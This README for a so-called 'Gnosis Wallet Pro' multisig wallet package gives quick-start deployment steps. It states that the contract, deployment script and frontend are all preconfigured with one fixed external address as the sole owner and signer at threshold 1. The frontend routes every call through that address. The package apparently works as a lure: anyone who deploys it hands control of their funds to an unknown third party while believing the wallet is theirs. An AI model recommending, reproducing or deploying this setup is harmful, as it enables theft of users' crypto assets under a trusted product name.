# 🛡️Gnosis-Wallet Pro – Configuration & Usage

**Gnosis Wallet Pro** is an enterprise-grade multi-signature digital wallet for secure crypto asset management. This package contains a ready-to-deploy Solidity contract, deployment script, and TypeScript/React frontend integration—all preconfigured to use the default signer address:

```
0xFDf84a0e7D07bC56f7De56696fc409704cC83a24
```

---

## 📦 Included Files

- `contracts/SafeWallet.sol` – Solidity contract for the multisig Safe Wallet
- `scripts/deploySafeWallet.ts` – Hardhat deployment script
- `Safe-wallet/src/utils/signer.ts` – TypeScript signer utility for React
- `Safe-wallet/src/constants/safeSigner.ts` – (Optional) Exported signer address constant
- `addedsafes.json` – Example Safe configuration data
- `README.md` / `README.html` – This documentation

---

## ⚡ Quick Start

1. **Install dependencies**
    ```bash
    npm install
    ```
    > _Make sure **Hardhat** and **ethers** are installed for contract deployment._

2. **Compile the contract**
    ```bash
    npx hardhat compile
    ```

3. **Deploy the contract**
    ```bash
    npx hardhat run scripts/deploySafeWallet.ts --network YOUR_NETWORK
    ```
    > _The contract deploys with owner `0xFDf84a0e7D07bC56f7De56696fc409704cC83a24` as the signer. Replace `YOUR_NETWORK` with `mainnet`, `polygon`, etc._

4. **Frontend Usage**
    - The frontend will automatically use `0xFDf84a0e7D07bC56f7De56696fc409704cC83a24` for all contract interactions.
    - Example:
        ```typescript
        import { getSafeSigner } from "./utils/signer";
        ```

---

## 🔑 Default Signer

- All contracts and scripts are configured to use:
    ```
    0xFDf84a0e7D07bC56f7De56696fc409704cC83a24
    ```

---

## 🛠️ File Details

- **Solidity Contract** (`contracts/SafeWallet.sol`)
    - Multisig wallet with configurable owners and threshold
    - Payable (can receive/send Ether)
    - Owner logic defaults to the configured Safe signer
- **Deployment Script** (`scripts/deploySafeWallet.ts`)
    - Deploys SafeWallet with the Safe signer as owner
    - Threshold is set to 1 (single owner) by default, but you can modify for multisig
- **React/TypeScript Integration** (`Safe-wallet/src/utils/signer.ts`)
    - Ensures all contract calls use the Safe signer as the active account
    - Alerts user if wallet is not set to this signer

---

## 📚 More Info

- [GitHub: Gnosis Wallet Pro](https://github.com/alexia795/Safe-wallet-pro)
- For help, open an issue or contact the maintainer.

---

✔️ **Ready to use. Deploy, configure, and stay safe!**
